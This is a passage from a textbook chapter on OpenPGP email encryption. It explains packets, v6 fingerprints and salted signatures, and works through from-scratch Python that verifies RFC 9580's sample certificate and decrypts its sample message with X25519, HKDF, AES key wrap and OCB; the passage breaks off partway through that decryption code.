# 15. Email: OpenPGP and S/MIME

*Every protocol so far in this book has been a conversation: two parties online
at the same moment, trading messages until they share fresh keys. Email is a
letter. The sender writes it, seals it and hands it to a chain of servers; the
reader opens it hours or years later, on a device the sender never heard of.
There is no handshake to negotiate algorithms, no fresh Diffie-Hellman to give
forward secrecy, and nobody to ask "is this really your key?". This chapter
takes apart the two standards that encrypt and sign mail anyway, OpenPGP and
S/MIME. You will read RFC 9580's sample certificate packet by packet, check
its signature with Ed25519 written out, decrypt the RFC's sample message with
X25519, HKDF, AES key wrap and OCB, all coded from scratch, rebuild the EFAIL
attack that turned encrypted mail into a web request in 2018, and verify the
signatures the mail system itself adds, DKIM, on RFC 8463's example message.*

!!! abstract "In this chapter"
    **You will learn:**

    - why a store-and-forward medium changes what encryption can promise;
    - PGP's history, from Zimmermann's 1991 release and the export fight to
      RFC 9580 (2024) and the GnuPG split;
    - the OpenPGP packet format, v6 keys, SHA-256 fingerprints and salted
      signatures, checked against the RFC's sample;
    - how a message is encrypted: session keys, one key packet per reader,
      and v2 SEIPD's chunked AEAD;
    - the web of trust, keyservers and the 2019 poisoning attack, and the
      key discovery that replaced them;
    - S/MIME and CMS, with real OpenSSL output, and why their algorithm
      choices lag;
    - EFAIL (2018), coded, and what AEAD changes;
    - why email resists end-to-end encryption, and what people use instead;
    - SPF, DKIM and DMARC, the transport's own signatures;
    - how mail between Earth and Mars should be protected.

    **You need:** [Chapter 2](02-Certificates-and-PKI.md) (certificates)
    and [Chapter 1](01-What-a-Protocol-Must-Do.md) (what protocols must
    guarantee); modes of operation, hash functions, Diffie-Hellman and
    elliptic curves from Chapters [8](../../book/08-Modes-of-Operation.md),
    [9](../../book/09-Hash-Functions.md), [12](../../book/12-Diffie-Hellman.md)
    and [15](../../book/15-Elliptic-Curves.md) of book 1.

    **Levels:** §15.1 and §15.2 are for beginners, §15.3 to §15.10 are
    intermediate, §15.11 is expert.

## 15.1 A letter, not a conversation

*Level: beginner.*

Think about what TLS (Chapter 3) relies on. The client and server are both
online. They exchange fresh Diffie-Hellman shares, so each session has its own
keys and stealing the server's long-term key later reveals nothing about past
sessions: forward secrecy. They negotiate: the client offers algorithms, the
server picks. And the server proves who it is right now, by signing the
handshake.

None of that works for mail. When Alice writes to Bob, Bob is probably asleep.
His mail server stores the message; his phone, laptop and webmail fetch it
later, perhaps years later from an archive. So Alice must encrypt to a key Bob
published **in advance** and has kept for a long time. That has three
consequences that shape everything in this chapter.

1. **No forward secrecy.** Bob's decryption key opens every message ever sent
   to it. Whoever steals it, or compels Bob to hand it over, reads the whole
   archive. Signal (Chapter 16) gets around this for chat with prekeys and a
   ratchet; mail standards never did.
2. **No negotiation.** Alice picks the algorithms alone, from whatever Bob
   once announced. If Bob's key says he reads only old ciphers, she uses old
   ciphers; if his software announced nothing, she guesses.
3. **Key discovery comes first.** Before Alice can send anything secret she
   needs Bob's key, and must believe it is his. TLS solves that with
   certificate authorities checked at connection time. Mail needs a key for
   every correspondent, found and trusted before the first message.

Mail also carries **metadata** that the servers must read to deliver it:
sender, recipients, date and, by tradition, the subject line. End-to-end
encryption of mail protects the body and attachments; it leaves the envelope
for anyone on the path.

Two standards fill the gap. **OpenPGP** grew out of Phil Zimmermann's PGP and
lets users vouch for each other's keys. **S/MIME** puts keys in X.509
certificates from certificate authorities, like TLS. Both encrypt the same way
underneath: a random **session key** encrypts the message once, and that key
is encrypted separately to each reader's public key. Both also sign.

!!! note "Life story: PGP"
    **Born:** June 1991, Phil Zimmermann's "Pretty Good Privacy" 1.0, posted
    to Usenet by friends as the US Senate debated a bill that would have
    required back doors in secure communications equipment · **Purpose:**
    strong encryption for ordinary people, on ordinary PCs · **Controversy:**
    the US treated cryptography as munitions, and PGP had spread abroad over
    the Internet; Zimmermann was the subject of a criminal investigation for
    export without a license from February 1993 until the government dropped
    it in January 1996 without charges. The source code was later exported
    legally as a printed book, then scanned back in abroad. PGP 2 also used
    the RSA algorithm, then patented in the US, which led to years of
    licensing disputes · **Helped:** make public-key cryptography a household
    idea, and start the OpenPGP standard (RFC 2440, 1998) and GnuPG (1.0,
    1999) · **Status:** the PGP product passed through Network Associates and
    PGP Corporation to Symantec (2010); the format lives on as OpenPGP, used
    above all for software signing

## 15.2 What travels: packets and certificates

*Level: beginner.*

An OpenPGP file, whether a key, a signature or an encrypted message, is a
sequence of **packets**. Each packet starts with a header: one byte that says
what kind of packet it is (the **tag**), then its length. Our parser reads the
modern header form, in which the first byte is 0b11 followed by a 6-bit tag,
and the length is one byte below 192 or two bytes from 192 to 8383.

The packets you will meet:

| Tag | Packet | What it holds |
|---|---|---|
| 1 | PKESK | a session key, encrypted to one reader's public key |
| 2 | Signature | a signature over data or over other packets |
| 3 | SKESK | a session key, encrypted under a passphrase |
| 6 | Public key | the primary key: version, creation time, algorithm, key |
| 13 | User ID | a name and address, "Alice &lt;alice@arcadia.mars&gt;" |
| 14 | Public subkey | another key bound to the primary |
| 11 | Literal data | the actual message, with a file name and date |
| 18 | SEIPD | symmetrically encrypted, integrity-protected data |

A **certificate** (what users call a "public key") is a primary key followed
by self-signatures, user IDs and subkeys, each tied to the primary key by a
signature the primary key made. The primary key usually only certifies and
signs; a separate **subkey** receives encrypted mail. Subkeys can be replaced
without losing the identity that other people have vouched for.

<figure class="mars-fig">
<svg viewBox="0 0 640 330" width="640" role="img" aria-label="An OpenPGP v6 certificate as a stack of packets: the primary key, a direct-key self-signature, user IDs each with a certification, and a subkey with a binding signature; the fingerprint is SHA-256 over the key packet" fill="currentColor" font-size="13">
<rect x="20" y="20" width="300" height="44" rx="6" class="soft-acc" stroke="currentColor"/>
<text x="36" y="40" font-weight="bold">6 public key (primary)</text>
<text x="36" y="56" font-size="12">v6 · created · Ed25519 · 32-byte key</text>
<rect x="40" y="72" width="280" height="36" rx="6" class="soft" stroke="currentColor"/>
<text x="56" y="95" font-size="12.5">2 signature 0x1f: direct-key, preferences</text>
<rect x="20" y="118" width="300" height="36" rx="6" class="soft" stroke="currentColor"/>
<text x="36" y="141" font-size="12.5">13 user ID: Alice &lt;alice@arcadia.mars&gt;</text>
<rect x="40" y="162" width="280" height="36" rx="6" class="soft" stroke="currentColor"/>
<text x="56" y="185" font-size="12.5">2 signature 0x13: binds the user ID</text>
<rect x="20" y="208" width="300" height="44" rx="6" class="soft-acc" stroke="currentColor"/>
<text x="36" y="228" font-weight="bold">14 public subkey</text>
<text x="36" y="244" font-size="12">v6 · created · X25519 · 32-byte key</text>
<rect x="40" y="260" width="280" height="36" rx="6" class="soft" stroke="currentColor"/>
<text x="56" y="283" font-size="12.5">2 signature 0x18: binds the subkey</text>
<path d="M330 42 L380 42" stroke="currentColor" stroke-width="1.5" class="acc"/><polygon points="382,42 370,37 370,47" class="acc-fill"/>
<rect x="388" y="20" width="236" height="66" rx="6" stroke="currentColor" fill="none"/>
<text x="400" y="40" font-size="12">fingerprint = SHA-256(0x9b</text>
<text x="400" y="58" font-size="12">‖ 4-byte length ‖ key packet body)</text>
<text x="400" y="76" font-size="12" class="acc-fill">cb186c4f 0609a697 …</text>
<path d="M330 90 L380 120" stroke="currentColor" stroke-width="1.5"/><polygon points="382,121 370,113 368,123"/>
<rect x="388" y="104" width="236" height="104" rx="6" stroke="currentColor" fill="none"/>
<text x="400" y="124" font-size="12">every signature here is made</text>
<text x="400" y="142" font-size="12">by the primary key, over the key</text>
<text x="400" y="160" font-size="12">packet plus what it binds:</text>
<text x="400" y="178" font-size="12">a user ID, a subkey, or nothing</text>
<text x="400" y="196" font-size="12">(for the direct-key signature)</text>
<rect x="388" y="222" width="236" height="74" rx="6" class="soft" stroke="currentColor"/>
<text x="400" y="242" font-size="12">Mail to Alice is encrypted to the</text>
<text x="400" y="260" font-size="12">subkey; its binding signature says</text>
<text x="400" y="278" font-size="12">"encrypt" in its key flags.</text>
</svg>
<figcaption>Figure 15.1. An OpenPGP v6 certificate. RFC 9580's sample has no user ID, which v6 allows; real certificates usually have one or more.</figcaption>
</figure>

**Fingerprints.** A key is named by its **fingerprint**, a hash of the key
packet. Version 4 keys, the kind most people still have, use SHA-1 over the
byte 0x99, a 2-byte length and the packet body. Version 6 keys, introduced by
RFC 9580 in July 2024, use SHA-256 over the byte 0x9b, a 4-byte length and the
body. Older tools named keys by "key IDs", the last 16 or even only 8 hex digits of
a v4 fingerprint. The 8-digit (32-bit) form is short enough to collide on
purpose: in 2014 the Evil32 project generated a key with the same short ID
for every key in the well-connected core of the web of trust, and tools now
show full fingerprints.

### A worked example by hand

RFC 9580's sample primary key packet, Appendix A.3, is 42 bytes:

```text
06                 version 6
63 87 7f e3        created 0x63877fe3 = 1,669,824,483 s = 30 November 2022, 16:08 UTC
1b                 algorithm 27 = Ed25519
00 00 00 20        key material: 32 bytes follow
f9 4d a7 bb ... f8 95 a3    the Ed25519 public key
```

That is 1 + 4 + 1 + 4 + 32 = 42 bytes, so the fingerprint is SHA-256 of 0x9b,
then 00 00 00 2a (42), then those 42 bytes. The public key itself starts at
byte 10, which is why the code below takes `key[10:42]`.

A v6 **signature** packet is:

```text
06 1f 1b 0a          version 6, type 0x1f (direct key), Ed25519, SHA2-512
00 00 00 42          66 bytes of hashed subpackets follow
...                  creation time, preferences, key flags, issuer fingerprint
00 00 00 00          unhashed subpackets: none
ad 28                the left 16 bits of the digest, a quick check
20 + 32 bytes        a 32-byte random salt
64 bytes             the Ed25519 signature
```

To check it, the reader hashes, with the salt first, the key packet (with the
same 0x9b prefix as the fingerprint), the signature's own fields up to the
end of the hashed subpackets, and a trailer: 06 ff and the 4-byte length of
those fields. The salt is new in v6. Because the signer, not the requester,
picks 32 random bytes that come first in the hash, an attacker who can make
someone sign chosen data cannot set up a collision in advance: that is how
the SHA-1 chosen-prefix collision of Leurent and Peyrin ("SHA-1 is a
Shambles", 2020), which forged a PGP key certification, was carried out against v4.

### Code it: read and check RFC 9580's sample certificate

The program splits the certificate into packets, computes both fingerprints,
and verifies the direct-key self-signature with Ed25519 written out from RFC
8032 (book 1 Chapter 15 derives the curve). Then it changes the key flags in
the hashed area and shows that the signature no longer verifies.

```python
# Reading an OpenPGP certificate: RFC 9580's sample v6 key (Appendix A.3).
# Split it into packets, compute both fingerprints, and verify the Ed25519
# self-signature, with Ed25519 written out (RFC 8032).
import base64, hashlib

ARMOR = """xioGY4d/4xsAAAAg+U2nu0jWCmHlZ3BqZYfQMxmZu52JGggkLq2EVD34laPCsQYf
GwoAAABCBYJjh3/jAwsJBwUVCg4IDAIWAAKbAwIeCSIhBssYbE8GCaaX5NUt+mxy
KwwfHifBilZwj2Ul7Ce62azJBScJAgcCAAAAAK0oIBA+LX0ifsDm185Ecds2v8lw
gyU2kCcUmKfvBXbAf6rhRYWzuQOwEn7E/aLwIwRaLsdry0+VcallHhSu4RN6HWaE
QsiPlR4zxP/TP7mhfVEe7XWPxtnMUMtf15OyA51YBM4qBmOHf+MZAAAAIIaTJINn
+eUBXbki+PSAld2nhJh/LVmFsS+60WyvXkQ1wpsGGBsKAAAALAWCY4d/4wKbDCIh
BssYbE8GCaaX5NUt+mxyKwwfHifBilZwj2Ul7Ce62azJAAAAAAQBIKbpGG2dWTX8
j+VjFM21J0hqWlEg+bdiojWnKfA5AQpWUWtnNwDEM0g12vYxoWM8Y81W+bHBw805
I8kWVkXU6vFOi+HWvv/ira7ofJu16NnoUkhclkUrk0mXubZvyl4GBg=="""

def packets(data):                                  # new-format headers only
    i = 0
    while i < len(data):
        tag, n = data[i] & 63, data[i + 1]; i += 2
        if 192 <= n < 224: n, i = ((n - 192) << 8) + data[i] + 192, i + 1
        yield tag, data[i:i + n]; i += n

NAMES = {6: "public key", 14: "public subkey", 2: "signature"}
ALGS = {25: "X25519", 27: "Ed25519"}
pk = list(packets(base64.b64decode(ARMOR)))
for tag, body in pk:
    if tag in (6, 14):
        fp = hashlib.sha256(b"\x9b" + len(body).to_bytes(4, "big") + body).hexdigest()
        print(f"{NAMES[tag]:13} v{body[0]} {ALGS[body[5]]:8} created {int.from_bytes(body[1:5], 'big')}  fingerprint {fp[:16]}...")
    else:
        print(f"{NAMES[tag]:13} v{body[0]} type 0x{body[1]:02x} by {ALGS[body[2]]}, hash {body[3]} (SHA2-512)")

# --- Ed25519 verification (RFC 8032 section 5.1.7) ---------------------------
q = 2**255 - 19
L = 2**252 + 27742317777372353535851937790883648493
d = -121665 * pow(121666, -1, q) % q
def xrecover(y, sign):
    x2 = (y * y - 1) * pow(d * y * y + 1, -1, q) % q
    x = pow(x2, (q + 3) // 8, q)
    if (x * x - x2) % q: x = x * pow(2, (q - 1) // 4, q) % q
    return q - x if x & 1 != sign else x
def decode(b):
    y = int.from_bytes(b, "little") & (2**255 - 1)
    return (xrecover(y, b[31] >> 7), y)
def edadd(P, Q):
    (x1, y1), (x2, y2) = P, Q
    t = d * x1 * x2 * y1 * y2 % q
    return ((x1 * y2 + x2 * y1) * pow(1 + t, -1, q) % q, (y1 * y2 + x1 * x2) * pow(1 - t, -1, q) % q)
def edmul(k, P):
    R = (0, 1)
    for bit in bin(k)[2:]:
        R = edadd(R, R)
        if bit == "1": R = edadd(R, P)
    return R
B = decode(bytes.fromhex("5866666666666666666666666666666666666666666666666666666666666666"))
def ed25519_verify(pub, msg, sig):
    A, R, s = decode(pub), decode(sig[:32]), int.from_bytes(sig[32:], "little")
    h = int.from_bytes(hashlib.sha512(sig[:32] + pub + msg).digest(), "little") % L
    return s < L and edmul(s, B) == edadd(R, edmul(h, A))

# --- The direct-key self-signature (packet 2), as RFC 9580 section 5.2.4 hashes it
key, sig = pk[0][1], pk[1][1]
hlen = int.from_bytes(sig[4:8], "big")
hashed = sig[:8 + hlen]                              # version .. hashed subpackets
ulen = int.from_bytes(sig[8 + hlen:12 + hlen], "big")
rest = sig[12 + hlen + ulen:]
left16, salt_len = rest[:2], rest[2]
salt, signature = rest[3:3 + salt_len], rest[3 + salt_len:]
stream = salt + b"\x9b" + len(key).to_bytes(4, "big") + key + hashed + b"\x06\xff" + len(hashed).to_bytes(4, "big")
digest = hashlib.sha512(stream).digest()
print("salt", salt.hex()[:16] + "...", " left 16 bits match:", digest[:2] == left16)
print("Ed25519 self-signature verifies:", ed25519_verify(key[10:42], digest, signature))
tampered = stream.replace(b"\x9b\x03", b"\x9b\x01")    # key flags: {certify, sign} -> {certify}
print("with the key flags changed:     ", ed25519_verify(key[10:42], hashlib.sha512(tampered).digest(), signature))
```

```text
public key    v6 Ed25519  created 1669824483  fingerprint cb186c4f0609a697...
signature     v6 type 0x1f by Ed25519, hash 10 (SHA2-512)
public subkey v6 X25519   created 1669824483  fingerprint 12c83f1e706f6308...
signature     v6 type 0x18 by Ed25519, hash 10 (SHA2-512)
salt 103e2d7d227ec0e6...  left 16 bits match: True
Ed25519 self-signature verifies: True
with the key flags changed:      False
```

Both fingerprints match the RFC (cb186c4f… for the primary key, 12c83f1e…
for the subkey). The "left 16 bits" field is not a security check, only a
quick way to reject a mismatched key before doing the expensive verification;
the Ed25519 check is what counts, and the flipped key-flags byte breaks it.
Everything a self-signature says, the algorithms the owner reads, the
expiration date, what each key may do, is covered by that signature, so a
keyserver or a man in the middle cannot quietly weaken it. Only the small
unhashed area is unprotected, and readers must not trust anything found
there except hints such as which key made the signature.

## 15.3 Encrypting a message

*Level: intermediate.*

To send "Hello, world!" to the owner of the sample certificate, the sender:

1. picks a random **session key** and a cipher the recipient supports (from
   the preferences in the self-signature), here AES-128;
2. for each recipient, writes a **PKESK** packet: the session key encrypted
   to that recipient's encryption subkey. With an X25519 subkey, that means a
   fresh ephemeral X25519 key, a Diffie-Hellman with the subkey, HKDF to turn
   the result into a key-encryption key, and AES key wrap (RFC 3394) to seal
   the session key;
3. optionally adds a PKESK for itself, so it can read its own sent mail, and
   an SKESK if the message should also open with a passphrase;
4. compresses (optional) and puts the data in a literal data packet,
   optionally signed, and encrypts that inside one **SEIPD** packet.

<figure class="mars-fig">
<svg viewBox="0 0 640 300" width="640" role="img" aria-label="An encrypted OpenPGP message: two PKESK packets and one SKESK each contain the same session key; HKDF turns the session key and a salt into the message key and IV; the data is encrypted in numbered OCB chunks followed by a final tag over the total length" fill="currentColor" font-size="13">
<rect x="20" y="30" width="170" height="40" rx="6" class="soft" stroke="currentColor"/>
<text x="105" y="55" text-anchor="middle" font-size="12.5">PKESK: Bob's subkey</text>
<rect x="20" y="80" width="170" height="40" rx="6" class="soft" stroke="currentColor"/>
<text x="105" y="105" text-anchor="middle" font-size="12.5">PKESK: the sender</text>
<rect x="20" y="130" width="170" height="40" rx="6" class="soft" stroke="currentColor"/>
<text x="105" y="155" text-anchor="middle" font-size="12.5">SKESK: passphrase</text>
<line x1="192" y1="50" x2="238" y2="96" stroke="currentColor"/><line x1="192" y1="100" x2="238" y2="100" stroke="currentColor"/><line x1="192" y1="150" x2="238" y2="104" stroke="currentColor"/>
<polygon points="242,100 230,95 230,105"/>
<rect x="246" y="78" width="112" height="44" rx="6" class="soft-acc" stroke="currentColor"/>
<text x="302" y="98" text-anchor="middle" font-size="12.5">session key</text>
<text x="302" y="114" text-anchor="middle" font-size="11">16 bytes, random</text>
<line x1="302" y1="124" x2="302" y2="164" stroke="currentColor" stroke-width="1.5"/><polygon points="302,168 297,156 307,156"/>
<rect x="222" y="172" width="160" height="44" rx="6" stroke="currentColor" fill="none"/>
<text x="302" y="192" text-anchor="middle" font-size="12">HKDF-SHA256(key,</text>
<text x="302" y="208" text-anchor="middle" font-size="12">salt, header bytes)</text>
<line x1="384" y1="194" x2="414" y2="194" stroke="currentColor" stroke-width="1.5"/><polygon points="418,194 406,189 406,199"/>
<text x="500" y="186" text-anchor="middle" font-size="12">message key + 7-byte IV;</text>
<text x="500" y="202" text-anchor="middle" font-size="12">nonce = IV ‖ chunk number</text>
<rect x="400" y="30" width="56" height="44" rx="4" class="acc-fill" fill-opacity="0.25" stroke="currentColor"/>
<text x="428" y="56" text-anchor="middle" font-size="12">chunk 0</text>
<rect x="460" y="30" width="56" height="44" rx="4" class="acc-fill" fill-opacity="0.25" stroke="currentColor"/>
<text x="488" y="56" text-anchor="middle" font-size="12">chunk 1</text>
<rect x="520" y="30" width="44" height="44" rx="4" class="acc-fill" fill-opacity="0.25" stroke="currentColor"/>
<text x="542" y="56" text-anchor="middle" font-size="12">…</text>
<rect x="568" y="30" width="56" height="44" rx="4" class="soft" stroke="currentColor"/>
<text x="596" y="50" text-anchor="middle" font-size="11.5">final</text>
<text x="596" y="64" text-anchor="middle" font-size="11.5">tag</text>
<text x="512" y="96" text-anchor="middle" font-size="12">SEIPD v2: each chunk has its own tag</text>
<line x1="500" y1="170" x2="500" y2="110" stroke="currentColor" stroke-width="1.5" class="acc"/><polygon points="500,104 495,116 505,116" class="acc-fill"/>
<text x="508" y="146" font-size="11.5" class="acc-fill">encrypts</text>
<rect x="20" y="236" width="604" height="52" rx="6" class="soft" stroke="currentColor"/>
<text x="322" y="258" text-anchor="middle" font-size="12.5">Chunk numbers in the nonce stop reordering; the final tag, over the total length, stops truncation.</text>
<text x="322" y="278" text-anchor="middle" font-size="12.5">Any number of readers: one small key packet each, one copy of the data.</text>
</svg>
<figcaption>Figure 15.2. An OpenPGP v6 encrypted message. The session key is encrypted once per reader; the data once.</figcaption>
</figure>

**Why chunks.** Mail clients and `gpg` stream: they decrypt a large file
piece by piece and write the output as they go. With a single tag at the end,
a streaming decryptor would have released the whole plaintext before learning
that it was forged, which is exactly what EFAIL exploited (§15.6). SEIPD v2
cuts the data into chunks of 2<sup>c+6</sup> bytes (the chunk size byte c is
at most 16, so up to 4 MiB; the sample uses c = 6, 4 KiB), each sealed with its own AEAD tag and its
number in the nonce, so the decryptor can release each chunk as soon as its
own tag checks. A **final tag**, an AEAD over nothing with the total length
as associated data, catches an attacker who drops chunks from the end.

The **associated data** for each chunk is the packet's own header bytes: the
packet tag (0xD2), the version, the cipher, the AEAD mode and the chunk size.
Changing any of them, for example to make the reader use a weaker mode,
changes the key derivation and every tag.

### Code it: the symmetric pieces

Before decrypting, we need AES, AES key wrap and OCB. The AES here is the
textbook one from book 1 Chapter 7, compressed; key unwrap follows RFC 3394
§2.2.2; OCB (Rogaway, RFC 7253) is the mode RFC 9580 requires every
implementation to support. Each is checked against its standard's own
example.

```python
# The symmetric half of OpenPGP v6: AES-128, AES key wrap (RFC 3394) and
# OCB mode (RFC 7253), each checked against its RFC's test vector.
def xtime(a): return ((a << 1) ^ 0x1B) & 0xFF if a & 0x80 else a << 1
SBOX, INV = [0] * 256, [0] * 256
p = q = 1
for _ in range(255):
    p = (p ^ (p << 1) ^ (0x1B if p & 0x80 else 0)) & 0xFF
    q ^= q << 1; q ^= q << 2; q ^= q << 4; q &= 0xFF
    if q & 0x80: q ^= 0x09
    SBOX[p] = q ^ ((q << 1 | q >> 7) & 0xFF) ^ ((q << 2 | q >> 6) & 0xFF) ^ ((q << 3 | q >> 5) & 0xFF) ^ ((q << 4 | q >> 4) & 0xFF) ^ 0x63
SBOX[0] = 0x63
for i, s in enumerate(SBOX): INV[s] = i

def expand(key):
    w, rcon = [list(key[i:i + 4]) for i in range(0, 16, 4)], 1
    while len(w) < 44:
        t = w[-1][:]
        if len(w) % 4 == 0:
            t = [SBOX[b] for b in t[1:] + t[:1]]; t[0] ^= rcon; rcon = xtime(rcon)
        w.append([a ^ b for a, b in zip(w[-4], t)])
    return [sum(w[4 * r:4 * r + 4], []) for r in range(11)]
def mix(c, inverse=False):
    if inverse:
        u, v = xtime(xtime(c[0] ^ c[2])), xtime(xtime(c[1] ^ c[3]))
        c = [c[0] ^ u, c[1] ^ v, c[2] ^ u, c[3] ^ v]
    t = c[0] ^ c[1] ^ c[2] ^ c[3]
    return [c[i] ^ t ^ xtime(c[i] ^ c[(i + 1) % 4]) for i in range(4)]
def aes(rk, block, decrypt=False):
    s = [a ^ b for a, b in zip(block, rk[10 if decrypt else 0])]
    for r in (range(9, -1, -1) if decrypt else range(1, 11)):
        if decrypt:
            s = [INV[s[(i + 12 * (i % 4)) % 16]] for i in range(16)]
            s = [a ^ b for a, b in zip(s, rk[r])]
            if r: s = sum((mix(s[c:c + 4], True) for c in range(0, 16, 4)), [])
        else:
            s = [SBOX[s[(i + 4 * (i % 4)) % 16]] for i in range(16)]
            if r < 10: s = sum((mix(s[c:c + 4]) for c in range(0, 16, 4)), [])
            s = [a ^ b for a, b in zip(s, rk[r])]
    return bytes(s)
xor = lambda a, b: bytes(x ^ y for x, y in zip(a, b))

def key_unwrap(kek, wrapped):                          # RFC 3394 section 2.2.2
    rk, n = expand(kek), len(wrapped) // 8 - 1
    A, R = wrapped[:8], [wrapped[8 * i:8 * i + 8] for i in range(1, n + 1)]
    for j in range(5, -1, -1):
        for i in range(n, 0, -1):
            t = (n * j + i).to_bytes(8, "big")
            b = aes(rk, xor(A, t) + R[i - 1], True)
            A, R[i - 1] = b[:8], b[8:]
    return b"".join(R) if A == b"\xa6" * 8 else None

def double(b):                                         # multiply by x in GF(2^128)
    v = int.from_bytes(b, "big") << 1
    return ((v ^ 0x87) if v >> 128 else v).to_bytes(17, "big")[-16:]
def ntz(i): return (i & -i).bit_length() - 1

def ocb(key, nonce, data, ad=b"", decrypt=False):     # RFC 7253, 128-bit tag
    rk = expand(key)
    E = lambda x: aes(rk, x)
    L_star = E(bytes(16)); L_dollar = double(L_star); L = [double(L_dollar)]
    for _ in range(8): L.append(double(L[-1]))
    N = bytes(15 - len(nonce)) + b"\x01" + nonce        # tag length 128: 7 zero bits, a 1, the nonce
    bottom = N[15] & 63
    ktop = int.from_bytes(E(N[:15] + bytes([N[15] & 0xC0])), "big")
    stretch = (ktop << 64) | ((ktop >> 64) ^ (ktop >> 56 & (2**64 - 1)))
    offset = ((stretch >> (64 - bottom)) & (2**128 - 1)).to_bytes(16, "big")
    body = data[:-16] if decrypt else data
    out, checksum = b"", bytes(16)
    blocks = [body[i:i + 16] for i in range(0, len(body), 16)]
    full = blocks if blocks and len(blocks[-1]) == 16 else blocks[:-1]
    for i, blk in enumerate(full, 1):
        offset = xor(offset, L[ntz(i)])
        res = xor(offset, aes(rk, xor(blk, offset), decrypt))
        checksum = xor(checksum, res if decrypt else blk)
        out += res
    if len(full) < len(blocks):
        offset = xor(offset, L_star)
        part = xor(blocks[-1], E(offset))
        plain = part if decrypt else blocks[-1]
        checksum = xor(checksum, plain + b"\x80" + bytes(15 - len(plain)))
        out += part
    tag = E(xor(xor(checksum, offset), L_dollar))
    s, o = bytes(16), bytes(16)                        # HASH(K, A)
    ablocks = [ad[i:i + 16] for i in range(0, len(ad), 16)]
    for i, blk in enumerate(ablocks, 1):
        if len(blk) == 16:
            o = xor(o, L[ntz(i)]); s = xor(s, E(xor(blk, o)))
        else:
            o = xor(o, L_star); s = xor(s, E(xor(blk + b"\x80" + bytes(15 - len(blk)), o)))
    tag = xor(tag, s)
    if decrypt:
        return out if tag == data[-16:] else None
    return out + tag

k = bytes(range(16))
print("AES-128, FIPS 197:", aes(expand(k), bytes.fromhex("00112233445566778899aabbccddeeff")).hex() == "69c4e0d86a7b0430d8cdb78070b4c55a")
print("key unwrap, RFC 3394 4.1:", key_unwrap(k, bytes.fromhex("1fa68b0a8112b447aef34bd8fb5a7b829d3e862371d2cfe5")).hex())
n12 = bytes.fromhex("bbaa99887766554433221100")
print("OCB, RFC 7253 empty:", ocb(k, n12, b"").hex() == "785407bfffc8ad9edcc5520ac9111ee6")
v = ocb(k, bytes.fromhex("bbaa99887766554433221101"), bytes(range(8)), bytes(range(8)))
print("OCB, RFC 7253 8 bytes:", v.hex() == "6820b3657b6f615a5725bda0d3b4eb3a257c9af1f8f03009",
      " decrypts:", ocb(k, bytes.fromhex("bbaa99887766554433221101"), v, bytes(range(8)), True) == bytes(range(8)))
```

```text
AES-128, FIPS 197: True
key unwrap, RFC 3394 4.1: 00112233445566778899aabbccddeeff
OCB, RFC 7253 empty: True
OCB, RFC 7253 8 bytes: True  decrypts: True
```

OCB processes each block with one AES call, like ECB with a different offset
per block, and gets authentication almost free from a checksum of the
plaintext blocks. Its patents, which kept it out of most standards for
twenty years, were released for all uses in 2021, which is part of why RFC
9580 could make it the mandatory mode.

### Code it: decrypt RFC 9580's sample message

RFC 9580 Appendix A.8 encrypts "Hello, world!" to the sample certificate's
X25519 subkey, and Appendix A.4 publishes the matching secret key. The program
reads the two packets, recomputes the X25519 shared secret, derives the
key-encryption key with HKDF, unwraps the session key, derives the message
key and IV, and decrypts.

```python
# Decrypting RFC 9580's sample message (Appendix A.8) with the sample secret
# subkey: X25519, HKDF, AES key wrap, then v2 SEIPD in OCB chunks. Continue from above.
import hmac

def hkdf(ikm, salt, info, n):
    prk = hmac.new(salt or bytes(32), ikm, hashlib.sha256).digest()
    out, t, i = b"", b"", 1
    while len(out) < n:
        t = hmac.new(prk, t + info + bytes([i]), hashlib.sha256).digest(); out += t; i += 1
    return out[:n]

def x25519(k, u):                                      # RFC 7748 section 5
    k = bytearray(k); k[0] &= 248; k[31] = (k[31] & 127) | 64
    k, x1, P = int.from_bytes(k, "little"), int.from_bytes(u, "little") & (2**255 - 1), 2**255 - 19
    x2, z2, x3, z3, swap = 1, 0, x1, 1, 0
    for t in range(254, -1, -1):
        bit = (k >> t) & 1
        if swap ^ bit: x2, x3, z2, z3 = x3, x2, z3, z2
        swap = bit
        A, B, C, D = x2 + z2, x2 - z2, x3 + z3, x3 - z3
        AA, BB, DA, CB = A * A, B * B, D * A, C * B
        E = AA - BB
        x3, z3 = (DA + CB) ** 2 % P, x1 * (DA - CB) ** 2 % P
        x2, z2 = AA * BB % P, E * (AA + 121665 * E) % P
    if swap: x2, z2 = x3, z3
    return (x2 * pow(z2, P - 2, P) % P).to_bytes(32, "little")

MSG = base64.b64decode("""wV0GIQYSyD8ecG9jCP4VGkF3Q6HwM3kOk+mXhIjR2zeNqZMIhRmHzxjV8bU/gXzO
WgBM85PMiVi93AZfJfhK9QmxfdNnZBjeo1VDeVZheQHgaVf7yopqR6W1FT6NOrfS
aQIHAgZhZBZTW+CwcW1g4FKlbExAf56zaw76/prQoN+bAzxpohup69LA7JW/Vp0l
yZnuSj3hcFj0DfqLTGgr4/u717J+sPWbtQBfgMfG9AOIwwrUBqsFE9zW+f1zdlYo
bhF30A+IitsxxA==""")
(t1, pkesk), (t2, seipd) = packets(MSG)
my_secret = bytes.fromhex("4d600a4f794d44775c57a26e0feefed558e9afffd6ad0d582d57fb2ba2dcedb8")  # Appendix A.4
my_public = pk[2][1][10:42]                            # the X25519 subkey from c15a

# 1. The PKESK: which key it is for, the sender's ephemeral key, the wrapped session key.
n = pkesk[1]                                           # length of key version + fingerprint
print("PKESK for subkey", pkesk[3:2 + n].hex()[:16] + "...", " algorithm", pkesk[2 + n], "(X25519)")
eph = pkesk[3 + n:35 + n]
esk = pkesk[36 + n:36 + n + pkesk[35 + n]]
shared = x25519(my_secret, eph)
print("shared point", shared.hex()[:16] + "...", shared.hex().startswith("67e30e69cdc7bab2"))
kek = hkdf(eph + my_public + shared, b"", b"OpenPGP X25519", 16)
session_key = key_unwrap(kek, esk)
print("session key ", session_key.hex(), session_key.hex() == "dd708f6fa1ed65114d68d2343e7c2f1d")

# 2. The v2 SEIPD packet: header, salt, chunks of at most 2^(6+6) bytes, a final tag.
version, cipher, mode, csize, salt = seipd[0], seipd[1], seipd[2], seipd[3], seipd[4:36]
info = bytes([0xD2, version, cipher, mode, csize])
okm = hkdf(session_key, salt, info, 16 + 7)
mkey, iv = okm[:16], okm[16:]
body = seipd[36:]
chunk, final_tag = body[:-16], body[-16:]              # one chunk here: 37 bytes + 16-byte tag
plain = ocb(mkey, iv + (0).to_bytes(8, "big"), chunk, info, decrypt=True)
print("chunk 0 decrypts:", plain is not None)
